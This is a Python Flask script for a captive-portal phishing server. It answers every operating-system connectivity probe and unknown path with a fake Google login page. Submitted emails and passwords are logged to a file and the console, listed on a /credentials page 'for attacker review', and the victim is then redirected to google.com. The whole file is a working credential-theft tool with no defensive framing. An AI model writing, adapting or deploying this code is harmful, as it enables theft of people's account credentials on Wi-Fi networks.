#!/usr/bin/env python3
"""
captive_server.py — Captive portal HTTP server with fake Google login
Captures credentials and displays them to the attacker in real-time.
"""

import sys
import os
from flask import Flask, request, render_template, redirect, make_response
import logging
from datetime import datetime

app = Flask(__name__, template_folder="templates")

# Captured credentials storage
captured_creds = []

# Set up logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route('/')
@app.route('/index.html')
@app.route('/hotspot-detect.html')
@app.route('/generate_204')
@app.route('/gen_204')
@app.route('/connecttest.txt')
@app.route('/ncsi.txt')
@app.route('/success.txt')
@app.route('/library/test/success.html')
@app.route('/captiveportal/generate_204')
def captive_redirect():
    """All OS captive portal detection probes get redirected to the fake login."""
    return render_template('google_login.html')

@app.route('/login', methods=['POST'])
def login():
    """Capture credentials from the fake login form."""
    email = request.form.get('email', '').strip()
    password = request.form.get('password', '').strip()

    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    if email and password:
        entry = {
            'timestamp': timestamp,
            'email': email,
            'password': password,
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', 'Unknown')
        }
        captured_creds.append(entry)
        
        # Write to file immediately
        with open('captured_credentials.txt', 'a') as f:
            f.write(f"[{timestamp}] IP: {request.remote_addr}\n")
            f.write(f"    Email: {email}\n")
            f.write(f"    Password: {password}\n")
            f.write(f"    User-Agent: {entry['user_agent']}\n")
            f.write("-" * 60 + "\n")
        
        # Print to console with clear formatting
        print("\n" + "=" * 65)
        print(f"  [✓] CREDENTIALS CAPTURED at {timestamp}")
        print(f"  [→] IP Address:    {request.remote_addr}")
        print(f"  [→] Email:         {email}")
        print(f"  [→] Password:      {password}")
        print("=" * 65 + "\n")
        
        # Return success — victim sees "connected" message
        return "<html><body><script>window.location.href='https://google.com';</script></body></html>", 200

    return render_template('google_login.html')

@app.route('/credentials')
def show_credentials():
    """List all captured credentials (for attacker review)."""
    if not captured_creds:
        return "<h2>No credentials captured yet.</h2>"
    
    html = "<h2>Captured Credentials</h2><table border='1' cellpadding='8'><tr><th>#</th><th>Time</th><th>IP</th><th>Email</th><th>Password</th></tr>"
    for i, cred in enumerate(captured_creds, 1):
        html += f"<tr><td>{i}</td><td>{cred['timestamp']}</td><td>{cred['ip']}</td><td>{cred['email']}</td><td>{cred['password']}</td></tr>"
    html += "</table>"
    return html

@app.route('/<path:unknown_path>')
def catch_all(unknown_path):
    """All other paths serve the captive portal."""
    return render_template('google_login.html')

def run_server(host='0.0.0.0', port=80):
    """Run the captive portal Flask server."""
    print(f"[*] Captive portal server starting on {host}:{port}")
    print(f"[*] View captured creds at http://{host}:{port}/credentials")
    print(f"[*] Waiting for victims...\n")
    
    # Try to start on port 80, fall back to 8080
    try:
        app.run(host=host, port=port, debug=False, threaded=True)
    except PermissionError:
        print("[!] Port 80 requires root. Trying port 8080...")
        app.run(host=host, port=8080, debug=False, threaded=True)

if __name__ == '__main__':
    run_server()